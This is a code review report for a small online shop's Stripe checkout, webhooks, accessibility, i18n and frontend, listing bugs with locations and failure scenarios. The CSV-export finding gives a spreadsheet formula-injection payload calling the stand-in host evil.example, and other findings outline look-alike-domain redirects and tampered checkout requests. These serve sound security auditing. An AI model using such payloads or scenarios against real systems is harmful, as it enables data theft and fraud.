# Code review — July 1, 2026

A full-codebase review run across six dimensions (this branch's diff, backend
security, the commerce/money path, frontend correctness, accessibility + i18n,
and performance/build). Every finding below was independently challenged by two
adversarial verifiers instructed to refute it against the actual code; only
findings BOTH verifiers upheld are listed. 4 additional candidate findings were
refuted and discarded (including “Studio direct-publish conflicts with branch
protection” — verified safe).

Already fixed on this branch:

- **`.t3d` transition shorthand wiped existing hover/press easing** on cards
  that carry both the DEPTH tilt and `lg-button`/`transition-transform`
  (src/styles/index.css) — the finding below is kept for the record; the rule
  now re-declares the full transition list.

Everything else is **pre-existing** (not introduced by this branch) and left
for follow-up work, ordered by severity within each area.


## High (7)

### Meta Pixel Purchase conversion never fires on the Stripe success return

- **Where:** `app/providers.tsx:80`
- **Area:** Performance & build pipeline

The Purchase effect runs once on mount (`useEffect(..., [])`) and calls `(window as ...).fbq?.("track", "Purchase", purchase, sid ? { eventID: sid } : undefined)`. But `fbq` cannot exist at that moment: `adsAllowed` is initialized `useState(false)`, so on the first render the `{META_PIXEL_ID && adsAllowed ? <Script id="meta-pixel-base" strategy="afterInteractive">...}` block renders nothing. The consent effect flips `adsAllowed` in the same mount-effect pass, but the re-render that mounts the pixel `<Script>` (and the afterInteractive execution that defines the `fbq` queuing stub) happens strictly after all mount effects have run. So `window.fbq?.()` optional-chains into a silent no-op. Worse, the effect has already executed `sessionStorage.removeItem("lusik_purchase_value_v1")` (line 78), destroying the order value CheckoutView stashed (CheckoutView.jsx:327), so nothing can ever retry. CONFIG.ANALYTICS.META_PIXEL_ID is live ("1011469671814643" in src/data/config.js:227), so this is active production behavior.

**Failure scenario:** Customer pays via Stripe -> full-page redirect to /?order=success&session_id=... -> fresh document mounts Providers -> Purchase effect runs before the pixel base snippet exists -> fbq is undefined, the Purchase event (and its dollar value) is silently dropped, and the stashed value is deleted. Every single paid order produces zero Meta Purchase conversions, so the live ad campaigns get no conversion/ROAS signal at all.

### Free-shipping decision trusts stale client-side cart prices; when the browser wrongly shows "Free", the ZIP is never collected and the server silently charges the most-expensive zone-8 rate

- **Where:** `src/components/CheckoutView.jsx:130`
- **Area:** Commerce & money path

`const freeShipping = Math.round(subtotal * 100) >= CONFIG.FREE_SHIPPING_THRESHOLD_CENTS;` uses `subtotal`, which SiteProvider computes from each cart item's stored `price` — a display price pinned at add-to-cart time and rehydrated from localStorage (30-day TTL, `readStoredCart` only checks `Number.isFinite(Number(i.price))`) or from the `saved_carts` row (no TTL, no re-pricing). When `freeShipping` is true the ZIP input is hidden (`{!freeShipping && (` at line 678), `zipNeeded` is false, and the POST sends `ship_zip: null` (line 296). The server independently recomputes the subtotal from TRUSTED_PRODUCTS; if its number is below the threshold it calls `buildShippingOptionsForZip(null, ...)` → `rateForZip(null)` → `DEFAULT_ZONE` "8" → a $15.49 flat rate. The drift tests only compare constants; nothing covers persisted carts whose prices predate a price change — and the June 2026 bib price drop created exactly such carts.

**Failure scenario:** A customer saved a bag before the June price drop (e.g. old prices summing to $155; new trusted prices sum to $120). They return within 30 days (or sign in — saved_carts never expires): checkout shows "Shipping: Free", hides the ZIP field, and enables Pay. The server computes $120 < $150, gets ship_zip null, and attaches the $15.49 zone-8 option — a Buena Park customer who was told Free is charged $15.49 (even the correct paid rate would be $9.99) on the Stripe page.

### Journal list posts cannot be opened by keyboard or screen reader (click-only <article>)

- **Where:** `src/components/JournalView.jsx:41`
- **Area:** Accessibility & i18n

Both journal list layouts make the entire post card a plain <article> with only an onClick: mobile card `<article ref={tiltRef} onClick={onSelect} className="vt-rise t3d t3d-glare ... cursor-pointer">` (line 41) and the desktop list `<article className="group cursor-pointer pb-10" ... onClick={() => onSelectPost(post.slug)}>` (line 126). There is no <a>/<button>, no role, no tabIndex, and no key handler, so the cards are not focusable and not activatable without a mouse; screen readers announce them as static text with no interactive element. (Contrast: the "Keep reading" cards in JournalPostView, line 235, are real <button>s.)

**Failure scenario:** A keyboard-only or screen-reader user navigates to /journal: Tab skips every post card (the only focusable thing is the back button), so no post on the list can be opened at all — on desktop or mobile — except by typing the /journal/<slug> URL manually.

### Dialogs never move, trap, or restore focus despite aria-modal="true" (PolicyModal, AuthDrawer, BottomSheet, AccountSheet, ChatAssistant)

- **Where:** `src/components/PolicyModal.jsx:55`
- **Area:** Accessibility & i18n

PolicyModal renders `<div ... role="dialog" aria-modal="true" aria-labelledby=...>` with only an Escape listener — no initial focus into the dialog, no focus trap, and no focus restoration on close. The same pattern repeats in AuthDrawer.jsx (desktop drawer, line 405), BottomSheet.jsx (line 145-150), and ChatAssistant.jsx (line 124); no focus-trap utility exists anywhere in the repo (grep for focus()/FocusTrap confirms only WaitlistModal's autoFocus input and ImmersiveLightbox's close-button focus). aria-modal="true" tells assistive tech that everything outside the dialog does not exist, while the user's focus is still on the footer link/nav button that opened it.

**Failure scenario:** A screen-reader user clicks "Privacy Policy" in the footer: focus stays on the footer button, which aria-modal has just hidden from the accessibility tree — the user is focused on a 'nonexistent' element and Tab walks the entire background page, never reaching the dialog's Close button; on close after tabbing away, focus is lost to <body>.

### ImmersiveBuySheet flick-gesture targets are inverted — flicking from the medium detent snaps back to medium

- **Where:** `src/components/shop/ImmersiveBuySheet.tsx:256`
- **Area:** Frontend correctness

In onPointerUp: `if (d.vel > flickVel) target = cur > px.medium ? "medium" : "expanded"; // flick up` and `else if (d.vel < -flickVel) target = cur < px.medium ? "medium" : "collapsed"; // flick down`. The ternary arms are swapped. A flick UP always drags the sheet above its start height, so from the medium detent `cur > px.medium` is always true and the target becomes "medium" — the sheet falls back to where it started. Symmetrically a flick down from medium yields `cur < px.medium` → "medium". CONFIG.SHEET documents FLICK_VELOCITY_PX_MS as "a flick (jumps a detent)". Correct logic is `cur > px.medium ? "expanded" : "medium"` (up) and `cur < px.medium ? "collapsed" : "medium"` (down).

**Failure scenario:** On a phone, open any photo-led PDP (crib blanket, heritage bib sets — the immersive sheet products). The sheet opens at the default "medium" detent. Flick it up (even a long fast drag from 46dvh to near the top released with velocity > 0.6 px/ms): the sheet snaps back DOWN to medium instead of expanding. Flick down from medium: it snaps back up to medium instead of collapsing. Flicks only "work" by skipping a detent (collapsed→expanded, expanded→collapsed); slow drags below the velocity threshold are the only way to reach adjacent detents.

### "Order again" button in order history is a silent no-op

- **Where:** `src/routes/AccountRoute.jsx:20`
- **Area:** Frontend correctness

AccountRoute (the only mount of AccountView — AccountSheet.jsx is unreferenced) passes `onReorder={() => {}}`. OrderCard gates the button on truthiness: `{onReorder && (order.order_items?.length ?? 0) > 0 && (... <button onClick={() => onReorder(order)}>Order again ...` (OrderCard.jsx:285-293) — an empty arrow function is truthy, so the button renders on every order with items but clicking it does nothing.

**Failure scenario:** A signed-in customer with a past order opens /account, sees the "Order again →" button under the order, and clicks it: no cart addition, no navigation, no toast — the button is completely dead, with no indication anything is wrong.

### Placeholder-product waitlist CTAs are wired to a no-op — primary "Write me when it's ready" button does nothing

- **Where:** `src/routes/ProductRoute.jsx:40`
- **Area:** Frontend correctness

ProductRoute mounts ProductView with `onOpenWaitlist={() => {}}`. That prop is threaded to ProductPlaceholderView, whose waitlist buttons call `onClick={() => onOpenWaitlist?.(product)}` (lines 257 and 292). For unpriced placeholders this is the PRIMARY CTA (`placeholder.writeWhenReady`, next to the disabled "Currently unavailable" bar); for priced placeholders it is the tertiary "Add me to the list" button. Unlike SoldOutPanel — which dispatches the `openWaitlist` CustomEvent that SiteChrome listens for and opens WaitlistModal — the placeholder path relies entirely on this prop, and the only mount site passes a noop. ProductRoute's other stubs share the problem (see separate findings).

**Failure scenario:** A customer opens any coming-soon product page (e.g. /shop/<category>/<unpriced-placeholder>) and taps "Write me when it's ready" or "Add me to the list": nothing happens — no modal, no toast, no feedback. Every waitlist signup from product pages is silently lost; only sold-out live products (SoldOutPanel's CustomEvent path) still work.


## Medium (13)

### <html lang="en"> is never updated when the UI is switched to Armenian

- **Where:** `app/layout.tsx:69`
- **Area:** Accessibility & i18n

The root layout hardcodes `<html lang="en">` and LanguageProvider's setLang (src/i18n/LangContext.jsx:100-105) only updates React state + localStorage — nothing ever writes document.documentElement.lang, and no `lang="hy"` attribute is placed on any Armenian text node. src/data/languages.ts even documents that `code` "drives ... the <html lang=\"\"> attribute", but no code does it. This violates WCAG 3.1.1/3.1.2.

**Failure scenario:** A user sets the language to Հայերեն (hy): the entire page renders Armenian script inside a document declared lang="en", so VoiceOver/NVDA select an English voice and spell out or mangle every Armenian string, and browser translate/hyphenation features misidentify the content language.

### checkout.session.completed inserts order as 'paid' without checking session.payment_status

- **Where:** `netlify/functions/stripe-webhook.mjs:337`
- **Area:** Backend security (netlify/functions)

The completed-session handler dispatches at line 126, then straight through to the INSERT at line 337-356 which hardcodes `status, ... 'paid', 'in_progress'`. Nowhere in the completed path (lines 130-411) is `session.payment_status` inspected, and there are no handlers for `checkout.session.async_payment_succeeded` / `async_payment_failed` (dispatch table lines 111-128 only covers refunded/expired/failed/dispute/fraud/completed). The session deliberately omits `payment_method_types` (create-checkout-session.mjs line 419-431) so it uses dynamic payment methods configured in the Stripe Dashboard.

**Failure scenario:** If Lusik enables any delayed-notification method in the Stripe Dashboard (ACH us_bank_account, SEPA, Klarna, Afterpay, etc.), Stripe fires `checkout.session.completed` with `payment_status: 'unpaid'`. The webhook records the order as `paid`/`in_progress`, sends the customer 'Lusik is starting on your order', and Lusik hand-stitches + ships a made-to-order piece. If the async debit later fails (`async_payment_failed`, which is never handled), the shop shipped a product that was never paid for.

### Webhook records unclamped quantities: Stripe charges at most 99 units per line, but the order row and admin email can record the raw tampered qty

- **Where:** `netlify/functions/stripe-webhook.mjs:211`
- **Area:** Commerce & money path

create-checkout-session clamps qty only for the Stripe line item (`const qty = Math.min(99, rawQty)`, line 267) but stashes the raw request `cart` in the pending-orders blob (line 501). The webhook then rebuilds items with `const qty = Number.isInteger(i.qty) && i.qty > 0 ? i.qty : 1;` — no 99 cap — and writes that into `subtotal_cents`, `order_items.quantity`, and the admin email. The only other guard, `findInventoryViolation`, clamps to 99 too and is deliberately fail-OPEN on a DB error (line 325-327: "Inventory check failed (allowing checkout)").

**Failure scenario:** During a transient Neon hiccup (the documented fail-open window), a tampered POST with `qty: 500` for the bib passes: Stripe charges 99 × $22, but the order row records quantity 500 with subtotal_cents 1,100,000. The admin email tells Lusik to stitch 500 bibs paid as 99, and `soldByGroup` counts 500 sold — instantly marking the product sold out for all other customers.

### `npm run gen:sitemap` doesn't regenerate its own inputs — crashes on fresh clones, silently emits stale sitemaps otherwise

- **Where:** `package.json:15`
- **Area:** Performance & build pipeline

`"gen:sitemap": "node scripts/gen-journal-posts.mjs && node scripts/gen-sitemap.mjs"` only runs the journal generator, but scripts/gen-sitemap.mjs:16 does `import { CATALOG } from "../src/data/catalog.js"`, and catalog.js imports `cmsProductsData.generated.js` and `cmsCategoriesData.generated.js` — both gitignored build artifacts (.gitignore lines 23 and 54) produced only by gen-products.mjs/gen-categories.mjs, which this script never runs.

**Failure scenario:** Fresh clone: `npm ci && npm run gen:sitemap` fails with ERR_MODULE_NOT_FOUND for src/data/cmsProductsData.generated.js. Worse on an existing checkout: editor adds/renames a product in content/products/*.json and runs the documented `npm run gen:sitemap` step — gen-sitemap reads the stale on-disk generated catalog and silently writes public/sitemap.xml missing the new /shop/<cat>/<product> URL (or still listing a removed one), which then gets committed since sitemap.xml is tracked.

### Journal generator drops all markdown formatting the Studio's markdown widget produces — it renders as literal syntax

- **Where:** `scripts/gen-journal-posts.mjs:44`
- **Area:** Performance & build pipeline

`bodyToNodes` only recognizes three shapes: paragraphs starting with `"## "` (h2), paragraphs starting with `"> "` (blockquote), and plain text (`nodes.push({ type: "p", text: t.replace(/\n/g, " ") })`). The Studio's journal Body field is `widget: "markdown"` (public/studio/config.yml), whose toolbar emits `**bold**`, `*italic*`, `[text](url)`, `![alt](/journal-media/...)` image embeds, `- ` lists, and `###` headings — none of which are parsed, and JournalPostView renders `node.text` as plain text ({node.text} at src/components/JournalView.jsx:210/217/223). Even the supported blockquote is broken for multiple lines: `t.slice(2)` strips the `"> "` from only the first line, leaving literal `> ` prefixes on the rest.

**Failure scenario:** Lusik writes a post in the Studio and clicks the toolbar's Bold button or inserts an image via the media library -> the published page at /journal/<slug> shows literal `**text**` / `![alt](/journal-media/photo.jpg)` strings to every reader. A blockquote spanning two lines renders with a stray `> ` mid-sentence.

### Admin CSV export has no formula-injection escaping on customer-controlled fields

- **Where:** `src/components/AdminView.jsx:148`
- **Area:** Frontend correctness

`csvCell` only does RFC-4180 quoting: `if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;` — it never neutralizes cells starting with `=`, `+`, `-`, or `@`. Exported columns include customer-controlled values: `o.customer_email`, `o.shipping_address?.name`, address lines, and especially `o.gift?.message` (free text typed at checkout). Spreadsheet apps treat such cells as formulas on open.

**Failure scenario:** A customer places an order with gift message `=IMPORTXML("http://evil.example/x","//a")` (or a `=cmd|...` DDE payload). Lusik clicks "↓ CSV" in /admin and opens lusik-orders-YYYY-MM-DD.csv in Excel/Google Sheets: the formula executes, enabling data exfiltration or command execution on the admin's machine.

### Stripe idempotency key is generated once per mount and never re-minted (contrary to its own comment), so a retry after any payload change dead-ends checkout with idempotency_error

- **Where:** `src/components/CheckoutView.jsx:59`
- **Area:** Commerce & money path

`const idempotencyKeyRef = useRef(newIdempotencyKey());` is the only assignment; the comment above it claims "re-sent on retries until the request fully succeeds (then we mint a fresh one)" but no code ever mints a fresh key — not on error, not on success. create-checkout-session forwards it to `stripe.checkout.sessions.create(..., { idempotencyKey })`. Stripe rejects a replayed key whose request parameters differ, and the resulting error surfaces as the function's 502 ("Payment provider rejected the request. Please try again.") — which the customer cannot fix by trying again, because the same key is reused forever while the component stays mounted.

**Failure scenario:** Attempt 1 reaches Stripe (session created) but the response is lost to a network blip → error banner. The customer toggles "Add gift wrap" (or edits a qty via the desktop cart drawer) and taps Pay again → same key, different line items → Stripe returns idempotency_error → 502 shown; every subsequent retry fails identically until they navigate away from /checkout and back (remounting mints a new key).

### Gold --accent (#B08842, ~2.9:1 on cream) used as small-text color in dozens of components despite the token doc forbidding it

- **Where:** `src/components/MobileBottomNav.jsx:435`
- **Area:** Accessibility & i18n

The token block itself says: "#B08842 reads ~2.9:1 on cream — below WCAG AA for small text — so eyebrows/labels use this deeper gold (~5:1)" and provides --accent-text: #826027 (src/styles/index.css:86-91). Yet ~80 call sites still set text `color: "var(--accent)"`: the active bottom-nav tab label (`color: active ? "var(--accent)" : ...` on .lg-tab-label, 0.62rem ≈ 10px), CheckoutView's "Free" shipping and −$ discount amounts (lines 650/664), FreeShippingProgress's "You've earned free U.S. shipping." (line 24), MobileSearchView's price line and Clear button (lines 279/357), and the eyebrow labels in PolicyModal (69), WaitlistModal (71), AuthDrawer (258), CollapsibleCard (39). Measured contrast: 2.84:1 on #F5EFE3, 3.26:1 on #FFFFFF — both fail AA 4.5:1 for small text.

**Failure scenario:** A low-vision user in light mode looks at the mobile tab bar or the checkout totals: the currently-selected tab name and the "Free"/discount amounts render gold-on-cream at under 3:1 and are illegible, while the codebase's own --accent-text token that passes (~5:1) sits unused in these spots.

### PDP delivery estimate computes new Date() during render on an SSG page — guaranteed hydration mismatch after build day

- **Where:** `src/components/ProductShowcase.jsx:1253`
- **Area:** Frontend correctness

The delivery line renders `const est = getDeliveryEstimate();` inline during render, and getDeliveryEstimate defaults to `new Date()` (src/lib/deliveryEstimate.ts:33) formatting "Jul 8 – Jul 15"-style strings. app/shop/[category]/[product]/page.tsx uses generateStaticParams, so the blanket PDP HTML is prerendered at build time with the build machine's date (UTC). On the client, hydration recomputes from the visitor's current local date. ProductRoute's own comment claims "all browser access ... runs in effects/handlers, not at render" — this line violates that.

**Failure scenario:** Any visit to /shop/blankets/armenian-alphabet-blanket a day or more after the last deploy (or same day across the UTC/local timezone boundary): the ship-by/arrives-by text differs from the server HTML, React 18 throws a hydration text-mismatch, logs a recoverable error (noise in Sentry once DSN is set), and re-renders the route client-side — and until JS loads, the visible dates are the stale build-date estimate.

### Desktop nav stays partly English in Armenian: "Shop", "Journal", "· Coming soon" hardcoded next to t() siblings

- **Where:** `src/components/ShopMegaMenu.jsx:31`
- **Area:** Accessibility & i18n

ShopMegaMenu calls `const t = useT();` but never uses it: the trigger renders literal `Shop`, each placeholder row renders literal `· Coming soon` (line 54), and the footnote paragraph (line 61-63) is hardcoded English. SiteTopNav.jsx:39 likewise hardcodes `Journal` while its siblings use t("nav.story"), t("nav.faq"), t("nav.shipping"), t("nav.connect") — and no nav.shop/nav.journal keys exist in translations.js to fall back on, even though the mobile nav translates the same concepts (mobileNav.products/journal → Ապրանքներ/Օրագիր) and search.comingSoon → Շուտով exists.

**Failure scenario:** A user switches the site to Հայերեն on desktop: the top bar reads "Shop · Մեր պատմությունը · Journal · Հաճախ տրվող հարցեր …" and the shop dropdown labels placeholder products "· Coming soon" in English — a mixed-language nav on the primary navigation surface.

### Collapsed immersive buy sheet hides Add-to-Bag controls with aria-hidden while they remain keyboard-focusable

- **Where:** `src/components/shop/ImmersiveBuySheet.tsx:413`
- **Area:** Accessibility & i18n

`<div className={cx(styles.body, collapsed && styles.bodyHidden)} aria-hidden={collapsed}>{children}</div>` — but .bodyHidden is only `opacity: 0; pointer-events: none;` (ImmersiveBuySheet.module.css:224-227). opacity:0 does not remove descendants from the tab order and there is no `inert`, `visibility: hidden`, or tabIndex management, so all buy controls (quantity picker, Add to Bag button, option inputs) stay Tab-reachable while marked aria-hidden="true" — the classic 'aria-hidden element contains focusable content' failure (axe: aria-hidden-focus).

**Failure scenario:** On a phone PDP with the sheet collapsed to the pill, a user with a Bluetooth keyboard or switch access presses Tab: focus lands on the invisible Add-to-Bag button — the screen shows only the pill, nothing announces (aria-hidden), and pressing Enter adds an item to the bag with no visible or audible feedback.

### Guest "Sign in" toast action on Save design is a no-op

- **Where:** `src/routes/ProductRoute.jsx:38`
- **Area:** Frontend correctness

ProductRoute passes `onRequireSignIn={() => {}}` to ProductView → ProductShowcase. handleSaveDesign for guests shows `toast({ kind: "info", message: "Sign in to save designs to your account.", action: { label: "Sign in", onClick: () => onRequireSignIn?.() } })` (ProductShowcase.jsx:264-268). The auth drawer is owned by SiteChrome (`setAuthOpen`), but no wiring (prop or CustomEvent) connects this callback to it.

**Failure scenario:** A signed-out customer configures a blanket and taps "Save design": a toast appears with a "Sign in" action button; tapping it dismisses the toast and does nothing else — the auth drawer never opens, and the save path dead-ends unless the customer discovers the avatar button on their own.

### A Buy-Now purchase wipes the customer's entire saved bag on the /?order=success return

- **Where:** `src/state/SiteProvider.jsx:239`
- **Area:** Commerce & money path

The success-return handler clears both cart copies unconditionally: `if (orderJustCompleted) { window.localStorage.removeItem(CART_STORAGE_KEY); }` (line 239-241) and, for signed-in users, `db.saveCart([])` (line 289). But CheckoutRoute's express path checks out `[site.buyNowItem]` only — `const cart = site.buyNowItem ? [site.buyNowItem] : site.cart;` — so the saved bag was never part of the purchase, yet the return leg deletes it from localStorage and the server. Nothing distinguishes a buy-now success from a bag checkout success.

**Failure scenario:** Customer has 2 blankets in their bag, taps "Buy now" on a bib, pays on Stripe, and is redirected to /?order=success. The boot effect deletes lusik_cart_v1 and the session handler overwrites the server saved cart with [] — the 2 unpurchased blankets vanish from the bag on every device.


## Low (9)

### Permanent `will-change: transform` on the page-transition wrapper — whole-page compositor layer + fixed-position containing-block trap

- **Where:** `app/template.tsx:42`
- **Area:** Performance & build pipeline

The per-navigation wrapper renders `<m.div ... style={{ willChange: "transform, opacity" }}>` around every route's entire content and never removes it. `will-change: transform` (a) keeps the full page content promoted to its own compositor layer for the life of the page — memory/raster cost on low-end phones long after the ~300ms enter animation finishes — and (b) per spec makes the wrapper a containing block for `position: fixed` descendants even when no transform is applied. The codebase already carries two workaround comments for exactly this (src/components/shop/MobilePurchaseBar.jsx:14 and StickyMobileBuyBar.jsx:11 both reference the "framer-motion page wrapper" transformed-ancestor problem), confirming it bites in practice.

**Failure scenario:** Any new `position: fixed; bottom: 0` element rendered inside a route component (rather than in SiteChrome, which sits outside the template) anchors to the page wrapper instead of the viewport — it renders at the bottom of the document and scrolls away with the content. Meanwhile every page holds a full-page GPU layer permanently, inflating memory on the low-end mobile devices the June responsive pass targets.

### Origin allowlist preview regex matches attacker-registrable '<label>--<domain>' hosts for a custom apex domain

- **Where:** `netlify/functions/_lib/origin.mjs:38`
- **Area:** Backend security (netlify/functions)

`const previewRe = new RegExp(`^https://[a-z0-9-]+--${site.replace(/\./g, "\\.")}$`)` where site is the hostname of env.URL. For a production custom apex domain (env.URL=https://lusikandsons.com, site=lusikandsons.com) the pattern is /^https:\/\/[a-z0-9-]+--lusikandsons\.com$/, which matches `https://evil--lusikandsons.com` — a separate, registrable second-level domain, not a Netlify-controlled subdomain. Real Netlify previews for a custom-domain site live on `<hash>--<sitename>.netlify.app`, so this branch does not even match legitimate previews here; it only widens the allowlist. isAllowedOrigin then returns true and buildReturnUrls (create-checkout-session.mjs line 105) uses that Origin for the Stripe success_url/cancel_url.

**Failure scenario:** An attacker registers `x--lusikandsons.com`; a request carrying `Origin: https://x--lusikandsons.com` passes isAllowedOrigin, so the post-payment redirect targets the attacker domain — the exact Stripe-return open-redirect / phishing scenario origin.mjs was written to block. Practical impact is limited because the function sets no CORS headers, so a cross-origin caller cannot read the returned Stripe URL; this is a defense-in-depth regression rather than a turn-key exploit.

### customMetadata / customImageUrl pass unbounded from the request body into the pending blob and order_items JSONB

- **Where:** `netlify/functions/create-checkout-session.mjs:501`
- **Area:** Commerce & money path

The function carefully bounds gift (message .slice(0,500)), social handles, and customer_notes precisely because "without bounds an attacker could write a multi-MB gift message into orders JSONB" (its own comment, line 180-182) — but then stashes the raw `cart` (`await pending.setJSON(session.id, { cart, ... })`), and the webhook copies `customImageUrl: i.customImageUrl ?? null, customMetadata: i.customMetadata ?? null` (stripe-webhook.mjs lines 225-226) straight into order_items with no size or shape check.

**Failure scenario:** An attacker POSTs a valid $20 cart whose item carries a ~5 MB customMetadata string (within the Functions body limit) and completes payment: the multi-MB blob lands in order_items.custom_metadata JSONB, bloats the admin/customer emails built from summarizeItem (Resend rejects them — the helpers swallow the failure, so Lusik gets no order email), and rides along in every account export and admin-orders fetch for that order.

### stripe-webhook records order_items.quantity and subtotal_cents from unclamped client cart qty

- **Where:** `netlify/functions/stripe-webhook.mjs:211`
- **Area:** Backend security (netlify/functions)

In the completed handler, `const qty = Number.isInteger(i.qty) && i.qty > 0 ? i.qty : 1;` (line 211) has no upper bound, and that qty flows into `subtotalCents += unitCents * qty` (line 217) and `items.push({ quantity: qty })` (line 222) -> order_items.quantity / orders.subtotal_cents. But create-checkout-session.mjs clamps the Stripe line item to `Math.min(99, rawQty)` (line 267) while stashing the *raw* cart (item.qty is never mutated, line 501 stashes `cart`). So Stripe charges for <=99 units but the DB records the raw qty. order_items.quantity is also the source of truth for inventory (`_lib/inventory.mjs` soldByGroup sums oi.quantity).

**Failure scenario:** The pre-checkout inventory guard (create-checkout-session.mjs line 313) normally caps requested qty at remaining (<=DEFAULT_STOCK_LIMIT 5), so this is unreachable in steady state. But that guard fails OPEN on any DB error (catch at line 325 logs + continues). In that window an attacker submitting qty=200 pays for 99 units yet the order records quantity=200 and an inflated subtotal_cents; soldByGroup then reports the group as 200 sold, flipping `/inventory` and the checkout guard to sold-out and blocking all future sales of that product. Same divergence becomes routinely exploitable if any STOCK_LIMITS override is set above 99.

### Network failure during account/admin data fetches leaves permanent skeletons and kills the post-checkout order poll

- **Where:** `src/components/OrderHistory.jsx:51`
- **Area:** Frontend correctness

db's `call` helper does not catch fetch rejections (src/lib/db.js:25 — `await fetch(...)` throws on network error; only non-OK HTTP is converted to `{error}`). OrderHistory.fetchOnce does `const { orders: rows } = await db.listOrders();` with no try/catch — a rejection ends the fetchOnce retry chain permanently (the post-Stripe-return poll never resumes) and leaves `loading` true (skeletons forever) plus an unhandled promise rejection. Same pattern: AccountView.jsx:137 `db.listAddresses().then(...)` with no `.catch` (addresses stuck on "Loading…"), and AdminView.jsx:35 `await db.adminListOrders()` in `refresh` (orders stays null → skeletons forever). Only `refetchLive` wraps its call in try/catch.

**Failure scenario:** A customer returns from Stripe to /account?order=success while their connection blips (or the Functions host is briefly unreachable): the first listOrders rejects, the 6-attempt poll dies on attempt 1, and the page shows loading skeletons indefinitely with no error message until a full reload; the visibility-change refetch never clears `loading` either (it only sets orders).

### ShopMegaMenu misuses role="menu" and gives its trigger no popup semantics (no aria-haspopup/aria-expanded)

- **Where:** `src/components/ShopMegaMenu.jsx:34`
- **Area:** Accessibility & i18n

`<div className="shop-menu" role="menu">` wraps buttons with `role="menuitem"` (lines 40-56), but the trigger button (line 27-33) has no aria-haspopup or aria-expanded, the open/close state is pure CSS (:hover/:focus-within, index.css:330-335) so aria-expanded could never update, and there is no arrow-key/Home/End navigation or Escape handling that the ARIA menu pattern promises.

**Failure scenario:** A screen-reader user tabs to "Shop": nothing announces that a popup exists (activating the button navigates to /shop instead); if they tab onward, they land inside items announced as "menu … menuitem" where the expected Arrow-key navigation does nothing, and closing with Escape is impossible — the announced role contract does not match behavior.

### Touching a cart row mid-delete-commit stops the Framer animation without onComplete — item is never removed and the row sticks off-screen

- **Where:** `src/components/SwipeableRow.jsx:71`
- **Area:** Frontend correctness

onTouchStart unconditionally calls `x.stop();   // interrupt any in-flight settle`. But handleDelete also drives `x` via `animate(x, -window.innerWidth, { ..., onComplete: () => onSwipeDelete?.() })` (lines 124-128). `x.stop()` cancels that animation without firing onComplete, so `onSwipeDelete` (→ removeFromCart) never runs, yet the row is frozen at whatever large negative translate it had reached.

**Failure scenario:** On the bag page a customer swipes a row open, taps Delete, then touches the row again within the 180ms COMMIT_ANIM_MS slide: the animation halts mid-flight, the item visually appears deleted (row mostly off-screen) but remains in the cart and in the checkout total; it only springs back if they happen to tap the ghost row again (onClickCapture settle) or change the cart elsewhere.

### Mobile /shop category rail ships ~680 KB of full-resolution JPEG into two ~124px tiles via raw <img>

- **Where:** `src/components/shop/ShopIndexView.jsx:141`
- **Area:** Performance & build pipeline

`CategoryCard` (the mobile category carousel on the shop index) renders `<img src={image} alt={label} loading="lazy" style={{ width: "100%", height: "100%", objectFit: "contain", padding: 2 }} />` with the original assets `/img/abc-blanket/cover.jpg` (386 KB) and `/img/bib-examples/01.jpg` (295 KB), inside a 140x175px card. Every sibling card in the same file (FeaturedPieceCard line 204, ProductGridCard, and the new DesktopCategoryCard) uses `next/image` with `sizes`, which routes through the Netlify image CDN and serves ~10 KB AVIF/WebP variants. This one raw <img> bypasses it entirely.

**Failure scenario:** Every mobile visitor landing on /shop (the primary shopping surface) downloads and decodes ~680 KB of JPEG for two thumbnail-sized tiles — near the top of the page, so `loading="lazy"` doesn't defer it. On 4G that's roughly a second of extra transfer plus main-thread decode of two multi-megapixel images, for imagery displayed at ~124 CSS px.

### .t3d transition shorthand silently wipes existing hover/press transitions on cards that carry it

- **Where:** `src/styles/index.css:2166`
- **Area:** This branch’s diff (CMS rollback + DEPTH 3D layer)

`.t3d { transition: rotate 0.55s cubic-bezier(0.22, 1, 0.36, 1); }` uses the `transition` shorthand, which resets `transition-property` to `rotate` only. It sits at the bottom of the stylesheet with the same 0-1-0 specificity as `.lg-button { transition: background 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease, transform 0.15s ease; }` (line 942) and Tailwind's `transition` / `transition-transform` utilities (emitted at `@tailwind utilities`, line 33), so it wins the cascade and disables those transitions on every element carrying both classes: the desktop Explore cards (`t3d lg-button lg-shine ... transition`), `CategoryProductCard` and `DesktopCategoryCard` (`lg-button lg-shine t3d`), and the mobile Explore card (`t3d ... transition-transform` with `active:scale-[0.98]`). The DEPTH pass deliberately avoided the `transform` property in JS to compose with existing animations, but this CSS rule un-does existing *transitions* instead.

**Failure scenario:** On desktop, hover any /shop category card, category product card, or home Explore card: the `.lg-button:hover` translateY(-1px) lift plus background/border/box-shadow changes now snap instantly instead of easing over 0.15–0.2s (and snap back on mouse-out). On mobile, pressing an Explore card still scales to 0.98 but with no animated spring, since its `transition-transform` utility is neutralized. Fix direction: declare the rotate transition additively (e.g. include the pre-existing property lists, or scope the rule so it doesn't override `.lg-button`/Tailwind transitions).
